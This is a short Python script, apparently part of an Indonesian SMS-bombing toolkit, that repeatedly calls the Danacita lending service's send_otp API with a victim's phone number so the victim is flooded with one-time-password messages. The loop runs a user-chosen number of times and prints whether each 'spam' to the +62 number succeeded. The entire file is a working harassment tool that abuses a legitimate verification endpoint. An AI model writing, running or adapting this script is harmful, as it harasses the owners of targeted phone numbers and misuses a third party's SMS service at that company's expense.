import requests,os,sys,json
from time import sleep
from war.war import *

def dana(nom, jml):
	sleep(1)
	print("")
	for x in range(jml):
		cal = requests.get("https://api.danacita.co.id/users/send_otp/?mobile_phone=0"+nom).text
		if 'detail' in cal:
			print(f"{k}[+] {c}Spam ke {k}+62{nom} {c}Berhasil ")
			sleep(5)
		else:
			print(f"{r}[+] {c}Spam ke {k}+62{nom} {c}Gagal ")
			sleep(2)
